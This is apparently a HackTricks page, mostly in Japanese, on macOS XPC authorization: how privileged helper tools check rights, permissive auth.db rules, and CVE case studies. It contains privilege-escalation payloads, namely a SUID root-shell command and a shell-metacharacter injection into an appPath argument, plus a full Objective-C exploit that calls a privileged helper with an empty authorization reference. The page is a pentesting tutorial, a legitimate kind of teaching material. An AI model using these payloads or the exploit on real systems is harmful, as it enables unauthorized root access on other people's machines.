# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple は、接続している process に**公開された XPC method を呼び出す権限があるか**を認証する別の方法も提供しています。<sup>[[2]](#references)</sup>

アプリケーションが**特権ユーザーとしてアクションを実行する必要がある**場合、通常はアプリ自体を特権ユーザーとして実行する代わりに、root として HelperTool を XPC service としてインストールします。この service は、アプリから呼び出してそれらのアクションを実行できます。ただし、service を呼び出すアプリには十分な authorization が必要です。

### ShouldAcceptNewConnection always YES

[EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) に例があります。`App/AppDelegate.m` では、**HelperTool** への**接続**を試みます。一方、`HelperTool/HelperTool.m` の **`shouldAcceptNewConnection`** function は、前述した要件のいずれも**チェックしません**。常に YES を返します。<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
詳細については、このチェックを適切に設定する方法を参照してください。


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### アプリケーション権限

ただし、**HelperTool のメソッドが呼び出される際には認可処理が行われています**。

`App/AppDelegate.m` の **`applicationDidFinishLaunching`** 関数は、アプリの起動後に空の認可参照を作成します。これは常に成功するはずです。\
その後、`setupAuthorizationRights` を呼び出して、その認可参照に**いくつかの権限を追加**しようとします。
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` の `setupAuthorizationRights` 関数は、application の rights を auth database `/var/db/auth.db` に保存します。まだ database に存在しない rights のみを追加する点に注目してください：
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
アプリケーションの権限を取得するために使用される関数は `enumerateRightsUsingBlock` で、権限は `commandInfo` に定義されています：
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
これは、このプロセスの最後に、`commandInfo` 内で宣言された権限が `/var/db/auth.db` に保存されることを意味します。ここでは、**認証が必要**となる**各 method**について、**permission name** と **`kCommandKeyAuthRightDefault`** を確認できます。後者は、**誰がこの権限を取得できるか**を示します。<sup>[[1]](#references)</sup>

right にアクセスできるユーザーを示すために、異なる scope が存在します。その一部は [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) で定義されています（[すべての scope はここで確認できます](https://www.dssw.co.uk/reference/authorization-rights/)）。要約すると次のとおりです。<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Anyone</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nobody</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>現在の user は admin（admin group 内）である必要がある</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>user に authenticate を求める。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>user に authenticate を求める。admin（admin group 内）である必要がある</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>rules を指定する</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>right に関する追加の comments を指定する</td></tr></tbody></table>

### 権限の検証

`HelperTool/HelperTool.m` では、**`readLicenseKeyAuthorization`** function が **`checkAuthorization`** function を呼び出して、caller が **そのような method を実行する**権限を持っているかを確認します。この function は、calling process から送信された **authData** が**正しい形式**であることを確認し、その後、特定の method を呼び出すための **right を取得するために必要なもの**を確認します。すべて正常に処理されると、**返される `error` は `nil`** になります。
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
そのメソッドを呼び出す**権限を取得するための要件を確認する**際、`authorizationRightForCommand` 関数は、先ほどコメントアウトされていたオブジェクト **`commandInfo`** のみを確認します。その後、**その関数を呼び出す権限があるか**を確認するために **`AuthorizationCopyRights`** を呼び出します（flags によりユーザーとの対話が可能である点に注意してください）。<sup>[[1]](#references)[[3]](#references)</sup>

この場合、`readLicenseKeyAuthorization` 関数を呼び出すための `kCommandKeyAuthRightDefault` は `@kAuthorizationRuleClassAllow` に定義されています。したがって、**誰でも呼び出すことができます**。

### DB情報

この情報は `/var/db/auth.db` に保存されていると説明しました。次のコマンドですべての保存済みルールを一覧表示できます。
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
次に、誰がその権限にアクセスできるかを次の方法で確認できます：
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 許容的な権限

**すべての権限設定**は[**こちら**](https://www.dssw.co.uk/reference/authorization-rights/)で確認できますが、ユーザーの操作を必要としない組み合わせは次のとおりです:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- これは最も直接的なキーです。`false`に設定すると、この権限を取得するためにユーザーが認証情報を提供する必要がないことを指定します。
- これは、**以下の2つのいずれかと組み合わせるか、ユーザーが所属している必要のあるグループを指定する場合**に使用されます。
2. **'allow-root': 'true'**
- ユーザーがroot user（高い権限を持つユーザー）として操作しており、このキーが`true`に設定されている場合、root userは追加の認証なしでこの権限を取得できる可能性があります。ただし通常、root userの状態になるにはすでに認証が必要であるため、ほとんどのユーザーにとって、これは「認証不要」のシナリオではありません。
3. **'session-owner': 'true'**
- `true`に設定すると、sessionの所有者（現在ログインしているユーザー）が自動的にこの権限を取得します。ユーザーがすでにログインしている場合、追加の認証をbypassできる可能性があります。
4. **'shared': 'true'**
- このキーは、認証なしで権限を付与するものではありません。`true`に設定すると、いったん権限が認証された後、各processが再認証することなく、その権限を複数のprocess間で共有できることを意味します。ただし、`'authenticate-user': 'false'`などの他のキーと組み合わせない限り、権限を最初に付与する際には認証が必要です。

興味深い権限を取得するには、[**このscript**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)を使用できます。
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypassのケーススタディ

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: 特権Mach service `com.acustica.HelperTool`はすべての接続を受け入れ、その`checkAuthorization:` routineは`AuthorizationCopyRights(NULL, …)`を呼び出すため、任意の32バイトblobが通過します。続いて`executeCommand:authorization:withReply:`は攻撃者が制御するカンマ区切りの文字列をrootとして`NSTask`に渡すため、次のようなpayloadが可能になります。
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially SUID root shellを作成できます。詳細は[この write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)。<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listenerは常にYESを返し、`checkAuthorization:`には同じNULL `AuthorizationCopyRights`パターンが現れます。メソッド`exchangeAppWithReply:`は攻撃者の入力を2回`system()`文字列に連結するため、`appPath`にshellメタ文字（例: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`）を注入すると、Mach service `com.plugin-alliance.pa-installationhelper`経由でroot code executionが可能になります。詳細は[こちら](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)。<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: auditを実行すると`/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`が配置され、Mach service `com.jamf.complianceeditor.helper`が公開されます。また、callerの`AuthorizationExternalForm`やcode signatureを検証せずに`-executeScriptAt:arguments:then:`をexportします。単純なexploitでは、空のreferenceを`AuthorizationCreate`し、`[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`で接続して、このメソッドを呼び出すことで、rootとして任意のbinaryを実行できます。完全なreversing notes（およびPoC）は[Mykola Grymalyukのwrite-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)にあります。<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14、7.2.0–7.2.8、7.4.0–7.4.2は、authorization gateのないprivileged helperに到達する細工されたXPC messagesを受け入れていました。helperは自身のprivileged `AuthorizationRef`を信頼していたため、serviceにmessageを送信できる任意のlocal userが、rootとして任意のconfiguration変更やcommandの実行を強制できました。詳細は[SentinelOneのadvisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)を参照してください。<sup>[[5]](#references)</sup>

#### Rapid triage tips

- appがGUIとhelperの両方を提供している場合は、それぞれのcode requirementsを比較し、`shouldAcceptNewConnection`が`-setCodeSigningRequirement:`でlistenerをロックしているか（または`SecCodeCopySigningInformation`を検証しているか）を確認します。チェックがない場合、JamfのケースのようなCWE-863シナリオにつながることが多くあります。簡単な確認例は次のとおりです。
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- helper が authorization していると考えている対象と、client が実際に提供するものを比較します。Reversing の際は、`AuthorizationCopyRights` に break を設定し、`AuthorizationRef` が helper 自身の privileged context ではなく、`AuthorizationCreateFromExternalForm` から取得されていること（client が提供したもの）を確認します。そうでなければ、上記のケースと同様の CWE-863 パターンを発見した可能性が高いです。

## Authorization の Reversing

### EvenBetterAuthorization が使用されているか確認する

**`[HelperTool checkAuthorization:command:]`** という function が見つかった場合、その process は前述の authorization schema を使用している可能性があります。

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

この function が `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights`、`AuhtorizationFree` などの function を呼び出している場合、[**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) を使用しています。

**`/var/db/auth.db`** を確認し、user interaction なしで privileged action を呼び出す権限を取得できるか確認します。

### Protocol Communication

次に、XPC service との communication を確立できるように、protocol schema を見つける必要があります。

**`shouldAcceptNewConnection`** function は export されている protocol を示します。

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

この場合、EvenBetterAuthorizationSample と同じものなので、[**この行を確認してください**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

使用されている protocol の名前がわかれば、次のコマンドで **header definition を dump** できます。
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最後に、通信を確立するには、公開されている **Mach Service の名前** を知る必要があります。これを見つける方法はいくつかあります。

- 使用されている Mach Service を確認できる **`[HelperTool init]`**：

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist 内：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploitの例

この例では、以下を作成します。

- 関数を含むprotocolの定義
- accessを要求するために使用する空のauth
- XPC serviceへのconnection
- connectionが成功した場合のfunction呼び出し
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 悪用されたその他の XPC privilege helper

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## 参考資料

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([GitHub mirror](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac Privilege Escalation Flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Acustica Audio HelperTool XPC Service Local Privilege Escalation in Aquarius Desktop on macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Authorization Rights Reference (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)

{{#include ../../../../../banners/hacktricks-training.md}}
